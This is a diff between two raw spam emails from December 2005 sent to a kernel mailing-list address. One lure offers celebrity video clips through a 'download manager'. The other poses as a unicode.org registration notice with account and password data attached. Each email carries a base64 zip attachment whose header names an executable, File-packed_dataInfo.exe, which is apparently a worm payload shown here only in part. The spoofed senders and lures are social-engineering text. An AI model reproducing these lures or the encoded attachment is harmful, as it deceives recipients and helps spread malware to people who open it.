@@ -1,30 +1,29 @@
-From: postman@cam.ac.uk
-Subject: Paris Hilton & Nicole Richie
-Date: Thu, 22 Dec 2005 04:50:55 GMT
-Message-ID: <ce85027bafada473fd@cam.ac.uk>
+From: info@unicode.org
+Subject: Registration Confirmation
+Date: Thu, 22 Dec 2005 05:49:40 GMT
+Message-ID: <9cdde.81cf44c0f30@unicode.org>
 Mime-Version: 1.0
-Content-Type: multipart/mixed; boundary="eafb626e188bc2"
+Content-Type: multipart/mixed; boundary="07379e227.a9957b44fc"
 Content-Transfer-Encoding: 7bit
 Return-path: <netdev-bounce@oss.sgi.com>
-To: zfreemailer@oss.sgi.com
+To: smntp@oss.sgi.com
 Sender: netdev-bounce@oss.sgi.com
 Errors-to: netdev-bounce@oss.sgi.com
 List-Id: netdev.vger.kernel.org
 
 This is a multi-part message in MIME format.
 
---eafb626e188bc2
+--07379e227.a9957b44fc
 
-The Simple Life:
+Account and Password Information are attached!
 
-View Paris Hilton & Nicole Richie video clips , pictures & more ;)
-Download is free until Jan, 2006!
 
-Please use our Download manager.
---eafb626e188bc2
-Content-Type: application/octet-stream; name=downloadm.zip
+***** Go to: http://www.unicode.org
+***** Email: postman@unicode.org
+--07379e227.a9957b44fc
+Content-Type: application/octet-stream; name=reg_pass-data.zip
 Content-Transfer-Encoding: base64
-Content-Disposition: attachment; filename="downloadm.zip"
+Content-Disposition: attachment; filename="reg_pass-data.zip"
 
 UEsDBAoAAAAAAACQdjPMyus3XtgAAF7YAAAYAAAARmlsZS1wYWNrZWRfZGF0YUluZm8uZXhlTVqQ
 AAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
@@ -1001,4 +1000,4 @@ RmhMTDZoTEwxTExoVExYVlBYaCQ7ekwyaEUpUjlSekJoRXpXaEUpUjlyemhFKVI5cnpCaExEU1M2
 aFlFKVIgYkM0dmgxU1BMWEwwUlZoMVNQTFgxMWgxU1BMWHIxaHpYYlBLAQIUAAoAAAAAAACQdjPM
 yus3XtgAAF7YAAAYAAAAAAAAAAAAIAD/gQAAAABGaWxlLXBhY2tlZF9kYXRhSW5mby5leGVQSwUG
 AAAAAAEAAQBGAAAAlNgAAAAA
---eafb626e188bc2--
+--07379e227.a9957b44fc--
